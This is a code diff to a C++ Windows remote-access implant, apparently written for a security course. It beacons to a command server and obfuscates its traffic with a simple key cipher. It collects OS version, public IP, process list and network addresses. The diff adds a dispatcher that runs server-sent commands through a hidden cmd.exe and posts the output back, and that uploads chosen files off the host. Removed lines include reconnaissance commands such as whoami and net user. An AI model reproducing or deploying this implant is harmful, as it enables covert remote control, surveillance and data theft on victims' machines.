@@ -14,13 +14,13 @@ using namespace std;
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
 
 
-std::string encode(string key, string clear) {
+std::string encode(std::string key, std::string clear) {
 	string enc = "";
 	char key_c;
 	string enc_c;
 	int placeholder;
 
-	for (int i = 0; i < clear.length(); i++) {
+	for (UINT i = 0; i < clear.length(); i++) {
 		key_c = key[i % key.length()];
 		placeholder = int(clear[i]) + int(key_c);
 		enc_c = (placeholder % 127);
@@ -29,13 +29,14 @@ std::string encode(string key, string clear) {
 	return enc;
 }
 
-std::string decode(string key, string enc) {
+
+std::string decode(std::string key, std::string enc) {
 	string dec = "";
 	char key_c;
 	string dec_c;
 	int placeholder;
 
-	for (int i = 0; i < enc.length(); i++) {
+	for (UINT i = 0; i < enc.length(); i++) {
 		key_c = key[i % key.length()];
 		placeholder = 127 + int(enc[i]) - int(key_c);
 		dec_c = (placeholder % 127);
@@ -45,40 +46,33 @@ std::string decode(string key, string enc) {
 }
 
 
-std::string send_enc(std::string key) {
-	const char* IP = "127.0.0.1";
-	const int PORT = 5000;
-
-	string clear = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-	string result = encode(key, clear);
-
-	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
-	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
-	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
-	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/decode", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	BOOL reqSuccess =  HttpSendRequestA(hRequestCMD, NULL, NULL, (LPVOID)result.c_str(), result.length());
+std::string send_enc(std::string key, std::string data, std::string endpoint, HANDLE hConnect) {
+	//string clear = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[{()}]+=/\\?., ;:!@#$%^&*_-";
+	std::string result = encode(key, data);
+	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	BOOL reqSuccess =  HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)result.c_str(), result.length());
 	if (reqSuccess) {
 		DWORD receivedData = 0;
 		DWORD chunkSize = 2048;
 		std::string buf;
 		std::string chunk(chunkSize, 0);
-		while (InternetReadFile(hRequestCMD, &chunk[0], chunkSize, &receivedData) && receivedData)
+		while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
 		{
 			chunk.resize(receivedData);
 			buf += chunk;
 		}
 		return decode(key, buf);
 	}
-
+	return "Error";
 }
 
 
-//Uploads file to server
+//Uploads file to server via HTTP POST
 //Params: handle for internet, path of file to upload, server ip, port 
-BOOL doFileUpload(HANDLE hInternet, char* filepath, char* ip, int port) {
+BOOL doFileUpload(HANDLE hConnect, char* filepath) {
 	//https://stackoverflow.com/questions/6407755/how-to-send-a-zip-file-using-wininet-in-my-vc-application
 	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
-	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
 	char tail[] = "\r\n--CSEC476--\r\n";
 	char data[2048] = {};
 	DWORD bytesWritten = 0;
@@ -88,7 +82,6 @@ BOOL doFileUpload(HANDLE hInternet, char* filepath, char* ip, int port) {
 		return FALSE;
 	DWORD dataSize = GetFileSize(hFile, NULL);
 
-	HANDLE hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 	
@@ -115,10 +108,11 @@ BOOL doFileUpload(HANDLE hInternet, char* filepath, char* ip, int port) {
 
 
 //Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
-//Returns string buffer
-std::string execCmd(char* cmd, DWORD MAX_TIME)
+//Returns string buffer containing command output 
+std::string execCmd(std::string cmd, DWORD MAX_TIME)
 {
 	std::string output;
+	cmd = "cmd.exe /C " + cmd;
 	HANDLE hPipeRead;
 	HANDLE hPipeWrite;
 
@@ -136,7 +130,7 @@ std::string execCmd(char* cmd, DWORD MAX_TIME)
 	si.wShowWindow = SW_HIDE;
 	PROCESS_INFORMATION pi = { 0 };
 
-	BOOL fSuccess = CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 	if (!fSuccess)
 	{
 		CloseHandle(hPipeWrite);
@@ -184,7 +178,6 @@ std::string execCmd(char* cmd, DWORD MAX_TIME)
 }
 
 
-
 // Takes in request handle, returns string based on response
 std::string sendRequestGetResponse(HANDLE hRequest) {
 	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
@@ -204,17 +197,20 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 }
 
 
+//Gathers OS information via ProductName and DisplayVersion registry keys, returns string
 std::string getOSInfo() {
 	std::string str_data;
 	char value[256];
 	DWORD BufferSize = 255;
 	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	value[BufferSize] = 0;
 	str_data += value;
 	str_data += " ";
 	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
 	str_data += value;
 	return str_data;
 }
+
 
 //Attempts to get public IP of user by reaching out to ifconfig.me
 std::string getPublicIP(HANDLE hInternet) {
@@ -253,6 +249,7 @@ std::string getProcToStr() {
 }
 
 
+//Gets list of network interfaces and converts MAC/IP addresses to comma-separated string
 std::string getNetworkInfo() {
 	UINT i;
 	std::string nwInfo;
@@ -284,6 +281,7 @@ std::string getNetworkInfo() {
 					_itoa_s((int)pAdapter->Address[i], buf, 16);
 					if ((int)pAdapter->Address[i] < 0x10)
 						nwInfo += "0";
+					buf[UNLEN] = 0;
 					nwInfo += buf;
 					nwInfo += ",";
 					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
@@ -312,6 +310,7 @@ std::string getNetworkInfo() {
 		FREE(pAdapterInfo);
 	return nwInfo;
 }
+
 
 //Gathers all info from devices and converts to string
 //Currently includes: public IP, username, computer name, geolocation, memory amount, IP/MAC addresses
@@ -369,66 +368,76 @@ std::string gatherInfo(HANDLE hInternet) {
 int main() {
 	const char* IP = "127.0.0.1";
 	const int PORT = 5000;
-	const int SLEEPTIME = 1001;
+	const int SLEEPTIME = 1999;
+	DWORD MAX_CMD_TIME = 5 * (10000000);
 	const std::string key = "CSEC476";
-
-
 
 	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
 	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HttpEndRequestA(hRequest, NULL, NULL, NULL);
 
-	const char* pth = "C:\\Users\\shell\\Downloads\\scada_5.8.2_full_en.zip";
-	const char* cmd = "cmd.exe /c dir C:\\";
-	//const char* cmd = "cmd.exe /c ping google.com";
-
-	DWORD MAX_CMD_TIME = 5 * (10000000);
-	std::string cmdout = execCmd((char*)cmd, MAX_CMD_TIME);
-	//cout << execCmd((char*)cmd, MAX_CMD_TIME) << "\n";
-	//cout << execCmd((char*)"cmd.exe /c ping google.com", MAX_CMD_TIME) << "\n";
-	//cout << execCmd((char*)"cmd.exe /c whoami", MAX_CMD_TIME) << "\n";
-	//cout << execCmd((char*)"cmd.exe /c net user", MAX_CMD_TIME) << "\n";
-	//cout << execCmd((char*)"cmd.exe /c powershell.exe", MAX_CMD_TIME) << "\n";
-
-	//Sends cmd out to server
-	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
-	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/out", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	HttpSendRequestA(hRequestCMD, NULL, NULL, (LPVOID)cmdout.c_str(), cmdout.size());
-
-
-	std::string dc = send_enc(key);
-	cout << dc << "\n";
-	//return 0;
-	//doFileUpload(hInternet, (char*)pth, (char*)IP, PORT);
-
-
+	/*
 	//Sends Process List to Server
 	std::string procInfo = getProcToStr();
-	HANDLE hConnectPS = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
-	HANDLE hRequestPS = HttpOpenRequestA(hConnectPS, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HANDLE hRequestPS = HttpOpenRequestA(hConnect, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpSendRequestA(hRequestPS, NULL, NULL, (LPVOID)procInfo.c_str(), procInfo.size());
+	HttpEndRequestA(hRequestPS, NULL, NULL, NULL);
 
 	//Sends all other info to server
 	std::string allInfo = gatherInfo(hInternet);
-	HANDLE hConnect2 = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
-	HANDLE hRequest2 = HttpOpenRequestA(hConnect2, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, (LPVOID)allInfo.c_str(), allInfo.size());
-	if (reqSuccess2) {
-		cout << "success" << "\n";
-	}
-	else {
-		cout << GetLastError();
-	}
-
+	HANDLE hRequestInfo = HttpOpenRequestA(hConnect, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HttpSendRequestA(hRequestInfo, NULL, NULL, (LPVOID)allInfo.c_str(), allInfo.size());
+	HttpEndRequestA(hRequestInfo, NULL, NULL, NULL);
+	*/
 	
 	while (true) {
 		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-		cout << sendRequestGetResponse(hRequest) << "\n";
+		std::string response = sendRequestGetResponse(hRequest);
+		response = decode(key, response);
+		cout << "Response " << response << "\n";
 		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
+		std::string code = response.substr(0, response.find(" "));
+		switch (atoi(code.c_str())){
+		case 1:
+			//OK
+			cout << "Got 1" <<"\n";
+			break;
+		case 2:
+			//INFO
+			cout << "Got 2" << "\n";
+			send_enc(key, gatherInfo(hInternet), "/info", hConnect);
+			break;
+		case 3:
+			//PS
+			cout << "Got 3" << "\n";
+			send_enc(key, getProcToStr(), "/ps", hConnect);
+			break;
+		case 4:
+			//RUN
+			cout << "Got 4" << "\n";
+			send_enc(key, execCmd(response.substr(response.find(" ") + 1), MAX_CMD_TIME), "/out", hConnect);
+			break;
+		case 5:
+			//UPLOAD
+			cout << "Got 5" << "\n";
+			doFileUpload(hConnect, (char*) response.substr(response.find(" ") + 1).c_str());
+			break;
+		case 6:
+			//DOWNLOAD
+			cout << "Got 6" << "\n";
+			break;
+		case 7:
+			//KILL
+			cout << "Got 7" << "\n";
+			break;
+		default:
+			cout << "Got unknown value" << "\n";
+			break;
+		}
 		HttpEndRequestA(hRequest, NULL, NULL, NULL);
 		Sleep(SLEEPTIME);
 	}
-
 	return 0;
 }
